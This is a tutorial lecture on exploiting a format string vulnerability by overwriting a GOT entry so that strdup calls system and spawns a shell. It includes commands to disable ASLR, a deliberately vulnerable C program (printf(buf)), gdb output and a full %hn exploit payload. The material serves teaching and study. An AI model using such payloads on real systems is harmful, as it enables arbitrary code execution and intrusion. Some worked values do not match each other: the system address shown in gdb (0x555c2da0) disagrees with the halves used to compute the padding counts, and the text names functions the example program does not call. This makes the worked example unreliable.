# Format String Vulnerability 2

Please disable the following before going ahead:  
1. ASLR : `echo "0" | sudo dd of=/proc/sys/kernel/randomize_va_space`. 
2. Libc randomization : `ulimit -s unlimited`. 

I will continue the concept of arbitrary memory writes that I covered in previous lecture. If you have not been through that session, please go through it before moving forward, [Lecture 5](../Lecture5/README.md).  

In the previous Lecture we saw that how to perform arbitrary memory writes with format string vulnerability. And in this lecture we will see how to take benefits from those vulnerabilities and spawn the shell. Yes I am not joking, we can escalate these vulnerabilities to spawn the shell.

Before starting with the deep exploitation of this vulnerability, we will cover few of the topics required to perform the exploitation.

### 1. GOT
Global offset table comes in to the picture when your program is calling the external libraries and those external libraries are dynamically linked.
To know more about dynamic linking please follow: [this](https://en.wikipedia.org/wiki/Dynamic_linker). Dynamic linking reduces the size of binary but increase the run time complexity for the dynamic linked and also opens that path to perform GOT exploitation.
Global offset tables(GOT) stores the actual address of the function call, in form of the actual table. But this table is itself created by dynamic linker. There is an execution flow that defines how the linker will fill the entry in those GOT.  
Consider the following program:  

```C
int main()
{
    printf("Hello");
    exit(1);
}
```

The actual `printf` ad `scanf` resides in memory at some address(that binary don't know during invocation). The compiler will create on memory table to store the address of these external functions. The point to not here is that, the shared library will contain all the functions like `print`, `scanf`, `exit`, `system` but the GOT table will only contain the entries for `printf` and `exit` as only they are used by the programs.  
And this GOT will look like:  

| Name     | Address   |
|----------|-----------|
| `printf` | UNDEFINED |
| `scanf`  | UNDEFINED |

If you see, the address during the table GOT table creation are `UNDEFINED`. When your program is loaded into the memory, it does not know the exact location of shared library which is required to call the program. Rather your share library code resides in the memory at some address, which is not known to the compiler at compile time. So the compiler introduces stub to call dynamic linker or the address of function from the GOT.

#### Where is the stub ?
If you run the following command on one of the compiled binaries in this directory,  
`objdump -d ./string`  
```
Disassembly of section .plt:

08048360 <printf@plt-0x10>:
 8048360:	ff 35 04 a0 04 08    	pushl  0x804a004
 8048366:	ff 25 08 a0 04 08    	jmp    *0x804a008
 804836c:	00 00                	add    %al,(%eax)
	...

08048370 <printf@plt>:
 8048370:	ff 25 0c a0 04 08    	jmp    *0x804a00c
 8048376:	68 00 00 00 00       	push   $0x0
 804837b:	e9 e0 ff ff ff       	jmp    8048360 <_init+0x2c>

08048380 <strdup@plt>:
 8048380:	ff 25 10 a0 04 08    	jmp    *0x804a010
 8048386:	68 08 00 00 00       	push   $0x8
 804838b:	e9 d0 ff ff ff       	jmp    8048360 <_init+0x2c>
```

Now I will turn this into the GOT table, and lets see how the GOT table looks like.  

| Memory address        | Actual address of function |
|-----------------------|----------------------------|
| 0x804a00c -- `printf` | UNDEFINED                  |
| 0x804a010 -- `strdup` | UNDEFINED                  |

The memory address `0x804a00c` stores the actual address to the `printf` function like wise, the call to `strdup` is stored at `0x804a010`.
These calls in the during GOT table creation are `UNDEFINED` and this you cant, identify with objdump. You need to use a debugger to check if these call are blank in the beginning or not. I use `Hopper` for this.

If these GOT entries are blank in the beginning then, who fills these address to resolve the context. This is where the call to dynamic linker comes into the picture.

```
           Disassembly of section .plt:

+--------->08048360 <printf@plt+0x10>:
|           8048360:	ff 35 04 a0 04 08    	pushl  0x804a004
|           8048366:	ff 25 08 a0 04 08    	jmp    *0x804a008
|           804836c:	00 00                	add    %al,(%eax)
|          	...
|
|          08048370 <printf@plt>:
|           8048370:	ff 25 0c a0 04 08    	jmp    *0x804a00c
|           8048376:	68 00 00 00 00       	push   $0x0
+<---------+804837b:	e9 e0 ff ff ff       	jmp    8048360 <_init+0x2c>   <-------------+  OBSERVE
|
|          08048380 <strdup@plt>:
|           8048380:	ff 25 10 a0 04 08    	jmp    *0x804a010
|           8048386:	68 08 00 00 00       	push   $0x8
+<---------+804838b:	e9 d0 ff ff ff       	jmp    8048360 <_init+0x2c>   <-------------+  OBSERVE

```

`<printf@plt+0x10>` this is where the Dynamic linker comes into the picture. When the control flows from, function call it goes to the GOT, since during the first call the GOT entry is blank, so the `jmp    *0x804a010` instruction has no effect at all. So the control goes to the next line which `push $0x0, jump 8048360`, the latter jump instruction is nothing but the address of the dynamic linker. Then the dynamic linker is responsible for resolving the call and update the GOT entry. Then the subsequent calls are made using the address in GOT.  


Introducing GOT in the program, open up several paths for exploitation. Suppose the in case we are able to write some sane address on to address of `0x804a00c` which is the address where the address for `printf` will be updated by the linker then we can make our program go to our location when the `printf` will be called, what about `system`. It will make `printf` behave like `system`. This concept called **GOT exploitation**.


#### Connecting the dots :smiling_imp:
1. We know how to make format string write to arbitrary address.
2. We know how the functions are called.

```C
#include <stdio.h>
#include <string.h>
// compile with gcc -m32 temp.c

void foo(char *ch)
{
	char buf[100];
	strncpy(buf, ch, 100);
	printf(buf);
	char *name = strdup(buf);
	printf("\nHello %s", name);	
}

int main(int argc, char** argv) 
{
	foo(argv[1]);
	return 0;
}

```

We will overwrite the GOT entry of `strdup` with the address of `system`, so when the `strdup(buf)` is called, `system(buf)` executes. And if gave `/bin/sh` input as `buf`, then `system(/bin/sh"")` will exploit the shell.  

Writing an address using `%n` will be difficult as there is limit on the size of the number that can be written using %n, so will be splitting the address using the concept of `%hn` which is used to write, **2 bytes** at a time.  

Lets craft our payload which would look something like this:  
``./string `python -c 'import struct; print "sh;#" + struct.pack("<I", <SOME_ADDRESS>) + struct.pack("<I", <SOME_ADDRESS>) +"%<SOME_VALUE>x%11$hn%<SOME_VALUE>x%12$hn"'` ``

**11** and **12** are offsets to my location of buffer `buf` form the `printf` function call. This could be different in your case. You need to follow the concept discussed in previous lecture.  

We now have the offset on which we will write our address of `system` function in two parts, but we know that `%hn` will the number of characters printed with `printf` we have to print `len(address(system))` length of garbage. Since our string is limited in size, we cant do that as well. For that we need to take help from the `%x` format specifier. `%(n)x` format specifier will print `(n)` number of spaces in the output but will not increase the size of input string. :cool:  

The final payload may look like this  
``./string `python -c 'import struct; print "sh;#" + struct.pack("<I", 0x804a010) + struct.pack("<I", 0x804a012) +"%10948x%11$hn%13068x%12$hn"'` ``
Now lets take a look at how I found the address of the system,  
```bash
$ gdb ./string 
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...
GEF for linux ready, type `gef' to start, `gef config' to configure
62 commands loaded for GDB 7.11.1 using Python engine 3.5
[*] 6 commands could not be loaded, run `gef missing` to know why.
GEF for linux ready, type `gef' to start, `gef config' to configure
62 commands loaded for GDB 7.11.1 using Python engine 3.5
[*] 6 commands could not be loaded, run `gef missing` to know why.
Reading symbols from ./string...(no debugging symbols found)...done.
gef➤  b main 
Breakpoint 1 at 0x804854f
gef➤  r 
Starting program: /vagrant/Lecture6/string 

Breakpoint 1, 0x0804854f in main ()

gef➤  p system
$1 = {<text variable, no debug info>} 0x555c2da0 <system>
```

Now we have the address of `system` we now need to covert this address to the count for `%(n)x`. And that we will do in two parts.  
```python
>>> 0x2ad0 - 12
10948
>>> 0x555c - 0x2250
13068
```

This 2-split address that we calculated with `python` will be the value for `n` in `%x`. 

#### Final words.
1. Find out the address offset of buffer from printf.
2. Add `sh;#` to the beginning of buffer, followed by the address of GOT function location.
3. This address will be two parts, `base address of GOT`, `base address of GOT + 2`.
4. Write two bytes of content (`address of system fucntion call`) to the address specified in buffer.
5. Why not run the exploit? :cool:
